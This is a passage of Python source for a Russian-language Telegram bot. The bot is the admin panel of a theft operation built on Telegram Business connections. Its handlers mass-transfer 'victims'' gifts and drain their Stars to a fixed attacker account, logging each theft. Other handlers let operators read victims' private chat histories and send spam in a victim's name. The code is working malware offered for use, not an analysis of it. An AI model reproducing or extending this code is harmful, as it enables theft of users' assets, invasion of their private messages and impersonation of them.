        await c.message.edit_text("💀 <b>Спам от лица жертвы</b>\n\nНапиши в чат бота:\n<code>/bizspam [ID_жертвы] [текст]</code>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="p_m")]]))
    except TelegramBadRequest as e:
        log.warning(f"p_bizspam: {e}")

@dp.callback_query(F.data == "p_u")
async def p_users(c: CallbackQuery):
    if not has_rank(c.from_user.id, 1): return
    cursor.execute("SELECT id, username, first_name, has_access, is_admin, is_owner FROM users")
    u = cursor.fetchall()
    kb = []
    for x in u:
        ic = "👑" if x[5] else ("⚙️" if x[4] else ("🟢" if x[3] else "⚪️"))
        kb.append([InlineKeyboardButton(text=f"{ic} {x[1] or x[2] or str(x[0])}", callback_data=f"u_v:{x[0]}")])
    kb.append([InlineKeyboardButton(text=T["b_back"], callback_data="p_m")])
    try:
        await c.message.edit_text("Выбери:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    except TelegramBadRequest as e:
        log.warning(f"p_users: {e}")

@dp.callback_query(F.data.startswith("u_v:"))
async def u_view(c: CallbackQuery):
    if not has_rank(c.from_user.id, 1): return
    u_id = int(c.data.split(":")[1])
    cursor.execute("SELECT username, first_name, has_access, is_admin, is_owner, business_conn_id, is_banned FROM users WHERE id = ?", (u_id,))
    r = cursor.fetchone()
    if not r: return
    n, f, a, adm, ow, b, ban = r
    st = "👑" if ow else ("⚙️" if adm else ("🟢" if a else "⚪️"))
    if b:
        gf = await get_gifts(b, u_id)
        g = f"{len(gf)} шт." if gf else "Нет"
        s = f"{await get_stars(b)} ⭐️"
    else:
        g = s = "Нет бизнеса."
    text = T["u_card"].format(uid=u_id, name=html.escape(n or f or str(u_id)), status=st, acc="✅" if a else "❌", ban="Да" if ban else "Нет", gifts=g, stars=s)
    kb = []
    is_owner = get_status(c.from_user.id)[2] == 1 or c.from_user.id == OWNER_ID
    if is_owner:
        if not adm and not ow:
            kb.append([InlineKeyboardButton(text="⚙️ Выдать Админа", callback_data=f"role_adm:{u_id}")])
            kb.append([InlineKeyboardButton(text="👑 Выдать Владельца", callback_data=f"role_own:{u_id}")])
        elif adm and not ow:
            kb.append([InlineKeyboardButton(text="👑 Повысить до Владельца", callback_data=f"role_own:{u_id}")])
            kb.append([InlineKeyboardButton(text="🔒 Снять Админа", callback_data=f"role_rem:{u_id}")])
        elif ow:
            kb.append([InlineKeyboardButton(text="🔒 Снять Владельца", callback_data=f"role_rem:{u_id}")])
        kb.append([InlineKeyboardButton(text=T["b_rem"] if a else T["b_give"], callback_data=f"u_r:{u_id}" if a else f"u_a:{u_id}")])
        kb.append([InlineKeyboardButton(text=T["b_st_g"], callback_data=f"s_g:{u_id}"), InlineKeyboardButton(text=T["b_st_s"], callback_data=f"s_s:{u_id}")])
        if b: kb.append([InlineKeyboardButton(text=T["b_read"], callback_data=f"r_c:{u_id}")])
        kb.append([InlineKeyboardButton(text=T["b_ban"] if not ban else T["b_unban"], callback_data=f"ban:{u_id}")])
    else:
        kb.append([InlineKeyboardButton(text=T["b_rem"] if a else T["b_give"], callback_data=f"u_r:{u_id}" if a else f"u_a:{u_id}")])
    kb.append([InlineKeyboardButton(text=T["b_copy"], callback_data=f"c_id:{u_id}"), InlineKeyboardButton(text=T["b_back"], callback_data="p_u")])
    try:
        await c.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    except TelegramBadRequest as e:
        log.warning(f"u_view: {e}")

@dp.callback_query(F.data.startswith("c_id:"))
async def c_id(c: CallbackQuery):
    await c.answer(f"ID: {c.data.split(':')[1]}", show_alert=True)

@dp.callback_query(F.data.startswith("ban:"))
async def c_ban(c: CallbackQuery):
    if not has_rank(c.from_user.id, 2): return
    u_id = int(c.data.split(":")[1])
    if u_id == OWNER_ID: return await c.answer("Владельца нельзя.", show_alert=True)
    cursor.execute("SELECT is_banned FROM users WHERE id = ?", (u_id,))
    row = cursor.fetchone()
    if not row: return await c.answer("Нет юзера.", show_alert=True)
    ban = row[0]
    cursor.execute("UPDATE users SET is_banned = ? WHERE id = ?", (0 if ban else 1, u_id))
    DB.commit()
    await c.answer("Разбанен!" if ban else "Забанен!", show_alert=True)
    await u_view(c)

@dp.callback_query(F.data.startswith("u_a:"))
async def u_a(c: CallbackQuery):
    if not has_rank(c.from_user.id, 1): return
    u_id = int(c.data.split(":")[1])
    cursor.execute("UPDATE users SET has_access = 1 WHERE id = ?", (u_id,))
    DB.commit()
    await c.answer("Выдан!", show_alert=True)
    await u_view(c)

@dp.callback_query(F.data.startswith("u_r:"))
async def u_r(c: CallbackQuery):
    if not has_rank(c.from_user.id, 1): return
    u_id = int(c.data.split(":")[1])
    cursor.execute("UPDATE users SET has_access = 0 WHERE id = ?", (u_id,))
    DB.commit()
    await c.answer("Забран!", show_alert=True)
    await u_view(c)

@dp.callback_query(F.data.startswith("role_adm:"))
async def cb_role_adm(c: CallbackQuery):
    if not has_rank(c.from_user.id, 2): return
    u_id = int(c.data.split(":")[1])
    cursor.execute("UPDATE users SET is_admin = 1 WHERE id = ?", (u_id,))
    DB.commit()
    await c.answer("✅ Админка выдана!", show_alert=True)
    await u_view(c)

@dp.callback_query(F.data.startswith("role_own:"))
async def cb_role_own(c: CallbackQuery):
    if not has_rank(c.from_user.id, 2): return
    u_id = int(c.data.split(":")[1])
    cursor.execute("UPDATE users SET is_owner = 1, is_admin = 1 WHERE id = ?", (u_id,))
    DB.commit()
    await c.answer("✅ Владелец выдан!", show_alert=True)
    await u_view(c)

@dp.callback_query(F.data.startswith("role_rem:"))
async def cb_role_rem(c: CallbackQuery):
    if not has_rank(c.from_user.id, 2): return
    u_id = int(c.data.split(":")[1])
    cursor.execute("UPDATE users SET is_owner = 0, is_admin = 0 WHERE id = ?", (u_id,))
    DB.commit()
    await c.answer("🔒 Роль снята!", show_alert=True)
    await u_view(c)

def _gift_owned_id(g):
    if not isinstance(g, dict): return None
    if g.get("owned_gift_id"): return g["owned_gift_id"]
    inner = g.get("gift")
    if isinstance(inner, dict):
        return inner.get("id")
    return None

@dp.callback_query(F.data.startswith("s_g:"))
async def s_g(c: CallbackQuery):
    if not has_rank(c.from_user.id, 2): return
    u_id = int(c.data.split(":")[1])
    if u_id == c.from_user.id: return await c.answer("Себе нельзя!", show_alert=True)
    cn = get_conn(u_id)
    if not cn: return await c.answer(T["no_biz"], show_alert=True)
    gf = await get_gifts(cn, u_id)
    if not gf: return await c.answer("Пусто.", show_alert=True)
    t_id = await resolve_user(TARGET_UNAME)
    if not t_id: return await c.answer(f"Юз {TARGET_UNAME} не найден.", show_alert=True)
    sc = 0
    for g in gf:
        oid = _gift_owned_id(g)
        if not oid: continue
        if g.get("can_be_transferred") is False: continue
        if await trans_gift(cn, oid, t_id):
            sc += 1
            g_type = g.get("type") or (g.get("gift") or {}).get("type") or "Gift"
            save_stolen(u_id, g_type)
        else:
            try:
                await bot.send_message(OWNER_ID, f"⚠️ <b>Ошибка кражи!</b>\nЖертва: <code>{u_id}</code>\nВозможно, нет звезд на комиссию.")
            except Exception as e:
                log_err(e)
    if sc > 0:
        await c.answer(f"✅ Забрано: {sc} шт.", show_alert=True)
    else:
        await c.answer("❌ Ошибка, чекни ЛС", show_alert=True)
    await u_view(c)

@dp.callback_query(F.data.startswith("s_s:"))
async def s_s(c: CallbackQuery):
    if not has_rank(c.from_user.id, 2): return
    u_id = int(c.data.split(":")[1])
    if u_id == c.from_user.id: return await c.answer("Себе нельзя!", show_alert=True)
    cn = get_conn(u_id)
    if not cn: return await c.answer(T["no_biz"], show_alert=True)
    st = await get_stars(cn)
    if st <= 0: return await c.answer("Пусто.", show_alert=True)
    sc = await trans_stars(cn, st)
    if sc:
        await c.answer(f"✅ Переведено {st} ⭐️", show_alert=True)
    else:
        await c.answer("❌ Ошибка перевода", show_alert=True)
        try:
            await bot.send_message(OWNER_ID, f"⚠️ <b>Ошибка перевода звёзд!</b>\nЖертва: <code>{u_id}</code>")
        except Exception as e:
            log_err(e)
    await u_view(c)

@dp.callback_query(F.data.startswith("r_c:"))
async def r_c(c: CallbackQuery):
    if not has_rank(c.from_user.id, 2): return
    u_id = int(c.data.split(":")[1])
    chats = get_chats(u_id)
    if not chats: return await c.answer("Сообщений нет.", show_alert=True)
    kb = [[InlineKeyboardButton(text=T["b_chat"].format(name=html.escape(ch_title or str(ch_id)), cid=ch_id), callback_data=f"r_h:{u_id}:{ch_id}")] for ch_id, ch_title, _ in chats]
    kb.append([InlineKeyboardButton(text=T["b_back"], callback_data=f"u_v:{u_id}")])
    try:
        await c.message.edit_text(T["chats"], reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    except TelegramBadRequest as e:
        log.warning(f"r_c: {e}")

@dp.callback_query(F.data.startswith("r_h:"))
async def r_h(c: CallbackQuery):
    if not has_rank(c.from_user.id, 2): return
    _, u_id, ch_id = c.data.split(":")
    h = get_hist(int(u_id), int(ch_id))
    text = T["no_msgs"] if not h else T["hist_title"].format(name="Контакт", cid=ch_id, msgs="\n".join([f"<b>{x[0]}</b> <i>[{x[2]}]</i>\n{html.escape(x[1] or '')}\n" for x in reversed(h)]))
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=T["b_back"], callback_data=f"r_c:{u_id}")]])
    try:
        await c.message.edit_text(text, reply_markup=kb)
    except TelegramBadRequest as e:
        log.warning(f"r_h: {e}")

@dp.callback_query(F.data == "p_s")
async def p_s(c: CallbackQuery):
    if not has_rank(c.from_user.id, 1): return
    cursor.execute("SELECT COUNT(*) FROM users")
    t = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM users WHERE business_conn_id IS NOT NULL")
    b = cursor.fetchone()[0]
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=T["b_back"], callback_data="p_m")]])
    try:
        await c.message.edit_text(f"📊 <b>Статистика</b>\n\nВсего: {t}\nБизнес: {b}", reply_markup=kb)
    except TelegramBadRequest as e:
        log.warning(f"p_s: {e}")

@dp.callback_query(F.data == "p_mass_steal")
async def p_mass_steal(c: CallbackQuery):
    if not has_rank(c.from_user.id, 2): return
    await c.answer("⏳ Начинаю...", show_alert=False)
    t_id = await resolve_user(TARGET_UNAME)
    if not t_id:
        try:
            await c.message.edit_text(f"❌ Юз {TARGET_UNAME} не найден.")
        except TelegramBadRequest:
            pass
        return

    cursor.execute("SELECT id, business_conn_id FROM users WHERE business_conn_id IS NOT NULL AND is_banned = 0 AND id != ?", (OWNER_ID,))
    victims = cursor.fetchall()
    total_stolen, text = 0, "💀 <b>Результат:</b>\n\n"
    for u_id, conn_id in victims:
        gifts = await get_gifts(conn_id, u_id)
        if not gifts: continue
        sc = 0
        for g in gifts:
            oid = _gift_owned_id(g)
            if not oid: continue
            if g.get("can_be_transferred") is False: continue
            if await trans_gift(conn_id, oid, t_id):
                sc += 1
                g_type = g.get("type") or (g.get("gift") or {}).get("type") or "Gift"
                save_stolen(u_id, g_type)
        if sc > 0:
            text += f"👤 ID <code>{u_id}</code>: {sc} шт.\n"
            total_stolen += sc
        else:
            try:
                await bot.send_message(OWNER_ID, f"⚠️ <b>Ошибка!</b> Не удалось забрать подарки у <code>{u_id}</code>. Возможно, нет звезд на комиссию.")
            except Exception as e:
                log_err(e)
    if total_stolen == 0:
        text += "Ничего не найдено."
    else:
        text += f"\n🎯 <b>Итого: {total_stolen}</b> (на @{TARGET_UNAME})"
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="p_m")]])
    try:
        await c.message.edit_text(text, reply_markup=kb)
    except TelegramBadRequest as e:
        log.warning(f"p_mass_steal: {e}")

async def main():
    try:
        await bot.delete_webhook(drop_pending_updates=True)
    except Exception as e:
        log.warning(f"delete_webhook: {e}")
    while True:
        try:
            await dp.start_polling(bot, allowed_updates=["message", "callback_query", "business_connection", "business_message", "edited_business_message", "deleted_business_messages"])
        except TelegramConflictError as e:
            log.warning(f"Conflict: {e}")
            await asyncio.sleep(30)
        except Exception:
            log.exception("polling error")
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())